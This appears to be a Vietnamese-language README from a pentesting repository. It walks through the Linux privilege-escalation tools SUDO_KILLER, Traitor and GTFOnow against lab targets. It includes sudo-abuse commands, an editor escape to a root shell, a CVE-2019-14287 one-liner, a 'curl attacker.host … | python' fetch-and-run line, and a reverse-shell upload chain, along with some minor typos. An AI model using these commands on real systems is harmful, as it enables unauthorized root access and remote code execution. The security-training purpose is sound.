Các tool ở đây thường là để upload lên mục tiêu sau khi đã lấy được shell (Có thể thực hiện upload qua Meterpreter, Weevely, ...)
# SUDO_KILLER
![image](https://github.com/Myozz/everyTools/assets/94811005/92c08546-91c8-4ab3-a673-98597e0d72ac)
## Giới thiệu
- Link: [https://github.com/TH3xACE/SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)
- Đây là một công cụ được thiết kế để khai thác Privilege Escalation trên các hệ thống Unix-like.
- SUDO_KILLER có thể khai thác các lỗ hổng dưới đây: ![image](https://github.com/Myozz/everyTools/assets/94811005/71fb4f81-8f24-4747-a3a2-d2811dd3bd0f)
- Công cụ này vẫn được cập nhật các CVE mới như ```CVE-2023-22809```

## Thử nghiệm
- Ta sẽ sử dụng SUDO_KILLER trên mục tiêu, có thể thông qua reverse shell hay bất kì các nào khác có thể thực thi trên mục tiêu
- Nếu chạy mặc định mà không thêm bất kì tuỳ chọn nào, công cụ sẽ sử dụng hầu hết các chức năng để kiểm tra mục tiêu
### CVE Exploit
- Phần này được hiện ở phần **Checking for disclosed vulnerables (CVE)** ![image](https://github.com/Myozz/everyTools/assets/94811005/6c537e2c-2c54-4a77-a765-27d652bc9cf2)
- Ở đây công cụ sẽ liệt kê các CVE mà có khả năng cao hệ thống mục tiêu sẽ gặp phải, cũng như đưa ra một đường dẫn Exploit. Ta chỉ cần làm theo  ![image](https://github.com/Myozz/everyTools/assets/94811005/53e8b79c-3470-4cc4-b714-4adab97304d0)
- Như hình trên, ta đã khai thác thành công mục tiêu mà đổi được mật khẩu của root
### Dangerous Bins
- Hiển thị ở phần **Checking for Dangerous binaries within sudo** ![image](https://github.com/Myozz/everyTools/assets/94811005/59e12898-2135-460e-8d29-9e105c9c1f61)
- Phần này cho phép chỉnh sửa các file quan hệ thống như /etc/passwd
### Common Misconfiguration
![image](https://github.com/Myozz/everyTools/assets/94811005/030ec55e-c713-4658-a4c7-32c18a14b87e)
- Theo như hướng dẫn ta sẽ đọc file notes/chown-hR.txt tại folder của SUDO_KILLER ![image](https://github.com/Myozz/everyTools/assets/948Sửa11005/c6396386-f664-4778-8b0c-e6efa68b16e4)
- Thực hiện các bước được ghi trong file
  - Sử dụng sudo -l để kiểm tra cách lệnh mà ta có thể dùng với sudo
  - Ta để ý dòng thứ 2, ta có thể thực hiện một bash file trong thư mục user
  - Trước mắt ta chown -hR user:root /home/user/directory dưới quyền sudo ![image](https://github.com/Myozz/everyTools/assets/94811005/adc72f2c-bd53-4bb5-83bd-11a93ae86c0d)
  - Chuyển tới dir có đường dẫn tương ứng ![image](https://github.com/Myozz/everyTools/assets/94811005/99a9a14d-64b2-4a1f-96b7-41b5bbbeb182)
  - Bước tiếp theo là tạo một file setup.sh bên trong directory này với nội dung là ![image](https://github.com/Myozz/everyTools/assets/94811005/e7cf4563-0a5c-4169-928a-047cca115ac6)
  - Gán quyền thực thi cho file và chạy nó dưới quyền của sudo
  - Khi này để thực thi file vừa tạo ta cần phải quay lại thư mục gốc và chạy lệnh bằng sudo thôi ![image](https://github.com/Myozz/everyTools/assets/94811005/cb1ac512-c235-4e16-9bbf-be40ba5adc72)
### Excessive Right 
![image](https://github.com/Myozz/everyTools/assets/94811005/8f83d3bd-ede4-491e-ad59-b1f41b7bd611)
- Kiếm tra quyền của file và thư mục ![image](https://github.com/Myozz/everyTools/assets/94811005/efca74c2-151f-4801-8b64-772cbd6389f5)
- Ta thấy được có 2 file start và restart và ta (user) đang sở hữu file start.sh
- Kiểm tra bằng ```sudo -l```, ta còn thấy được ta có thể thực thi cũng như chính sửa 3 file start/restart/stop.sh bằng quyền root
- Đổi tên file ```start.sh``` thành một tên khác và thực hiện link ```start.sh``` với ```/bin/bash``` bằng lệnh ln -s
- Thực thi file ```start.sh``` với quyền sudo, vậy là ta đã thực hiện leo quyền thành công ![image](https://github.com/Myozz/everyTools/assets/94811005/262a2748-1a9e-4170-925d-86232dc957c6)
### Missing Script
![image](https://github.com/Myozz/everyTools/assets/94811005/cb3cbb6d-9030-4d98-9d4d-195eea6ede11)
- Kiểm tra quyền với ```sudo -l``` ![image](https://github.com/Myozz/everyTools/assets/94811005/964a9ba0-e043-442a-bc56-d27aa42672db)
- Ta thấy user có thể sử dụng file stop.sh với quyền sudo
- SUDO_KILLER thông báo thiếu file stop.sh tại đường dẫn của nó, vậy có nghĩa là đang có lỗi Missing Script tại đây
- Ta tạo file stop.sh với nội dung bash bất kỳ, rồi chạy nó bằng sudo ![image](https://github.com/Myozz/everyTools/assets/94811005/a1e31bdb-7249-434f-a38d-fccccb03e1d6)
### Dangerous environment variables
![image](https://github.com/Myozz/everyTools/assets/94811005/1084bb09-0beb-45ea-9497-37df4d2cfa2c)
- Ta sẽ làm theo hướng dẫn:
  - Copy file script trong dir exploits của tool sang dir /tmp/ của hệ thống
  - Thực thi lệnh ```sudo exploits/Env_exploit2.so <lệnh có thể chạy bằng sudo>``` (Kiểm tra bằng ```sudo -l```
  - ![image](https://github.com/Myozz/everyTools/assets/94811005/170dd49f-a63f-4fff-8b49-010487decb2f)
  - Ta thấy user có quyền thực thi lệnh cp bằng sudo. Vậy nên câu lệnh sẽ như sau: ```sudo exploits/Env_exploit2.so cp``` ![image](https://github.com/Myozz/everyTools/assets/94811005/cc6878e3-cf8a-40a6-94f3-b38618162db0)
### File permission hijacking (Chiếm quyền file)
![image](https://github.com/Myozz/everyTools/assets/94811005/be3fccdc-62cc-4651-b4c8-00d62fffac3f)
- Thực thi lệnh ```sudo /usr/local/bin/suđoeit /etc/printcap```
- Bên trong text editor, thực thi lệnh ```:set shell=/bin/sh``` rồi đến ```:shell```, ta sẽ mở được một root shell
### CVE-2019-14287
![image](https://github.com/Myozz/everyTools/assets/94811005/d43f18d7-0a5f-4135-8fb8-a7cc47454669)
- Làm theo hướng dẫn, ta thực thi lệnh sudo -u#-1 <path>, theo như tool thì có 2 path ta có thể dùng là **/bin/bash** và **/usr/bin/id**. Chỉ đơn giản như vậy và ta có thể vào root dễ dàng
# Traitor
## Giới thiệu
[https://github.com/liamg/traitor](https://github.com/liamg/traitor)
- Một tool tự động tìm các misconfiguration và khai thác chúng để leo quyền root
- Các lỗ hổng mà tool này có thể khai thác ![image](https://github.com/Myozz/everyTools/assets/94811005/e68717fd-b309-482d-8f4f-fe9269831e5a)
- Đây là một tool không được cập nhật kể từ 2022 nên có thể thiếu các vuln hay misconfig mới
## Các tuỳ chọn chính
- Nếu chỉ chạy tool mà không có bất kì flag nào thì tool sẽ tìm các vuln/misconfig mà có thể sử dụng để leo quyền
- ```-p```: Cung cấp password của người dùng hiện tại của mục tiêu (dùng để xác thực trong trường hợp cần thiết)
- ```-a```: Thử khai thác từng lỗ hổng có thể, dừng lại khi lấy được root shell
- ```-e```: Chỉ định misconfig/vuln để khai thác trên mục tiêu
# GTFOnow
- Link: [https://github.com/Frissi0n/GTFONow](https://github.com/Frissi0n/GTFONow)
- Một tool có khả năng khai thác hầu hết các misconfig trên GTFObin, và vẫn được cập nhật cho tới thời điểm hiện tại
- Có thể exploit bằng curl thay vì phải upload lên mục tiêu

      curl http://attacker.host/gtfonow.py | python
## Các tuỳ chọn chính
- ```--level <LEVEL>```: Tuỳ chỉnh giữa 2 level:
  - ```1```: Tuỳ chọn mặc định, quét nhanh mục tiêu
  - ```2```: Tuỳ chọn cho phép quét rộng hơn
- ```--risk <RISK>```: Mức độ rủi ro
  - ```1```: Tuỳ chọn mặc định, đảm bảo an toàn cho mục tiêu
  - ```2```: Tool sẽ tự động chỉnh sửa một số file cần thiết, chỉ nên sử dụng khi đã nắm rõ chúng làm những gì
- ```--command <COMMAND>```: Thực hiện một câu lệnh sau khi đã leo quyền thành công
- ```--auto```: Tự động khai thác thay vì yêu cầu chúng ta chọn
- ```-v```: Theo dõi tiến độ khi khai thác 
## Thử nghiệm
- Ta sẽ thực hiện qua một lab upload vuln ![image](https://github.com/Myozz/everyTools/assets/94811005/8c3a5213-aeac-4cee-ac09-68307936bfd1
- Sử dụng các công cụ tìm path/dir trên mục tiêu ta biết được mục tiêu lưu file tại path ```/uploads```
- Tiếp tục kiểm tra xem mục tiêu cho phép upload định dạng file nào, có thể tham khảo qua [https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln](https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln)
- Sau khi thực hiện kiểm tra, ta thấy được có thể sử dụng các định dạng file php1, php2,... (trừ php) có thể được sử dụng để khai thác
- Thực hiện tạo payload với định dạng file như trên, tham khảo các tool tạo payload ở [đây](https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln/Payloads)
- Upload payload vừa tạo được lên mục tiêu (Có thể tận dụng tool filepwner ở [https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln](https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln) để upload file qua config của nó, rồi thực hiện reverse shell (nên sử dụng meterpreter để có thể upload các công cụ kể trên lên mục tiêu
- Sau khi có được Meterpreter, bây giờ ta sẽ thử upload file GTFOnow lên mục tiêu bằng lệnh ```upload``` và dùng lệnh ```shell``` để thực thi lệnh trên mục tiêu ![image](https://github.com/Myozz/everyTools/assets/94811005/54420ce7-9162-4395-854c-81e747478410)
- Thực thi lệnh ```python gtfonow.py -a``` để bắt đầu khai thác tự động ![image](https://github.com/Myozz/everyTools/assets/94811005/c41eb7a8-29fa-425c-a729-b11adff819fb) 
- Như vậy là ta đã thành công leo quyền root lên mục tiêu

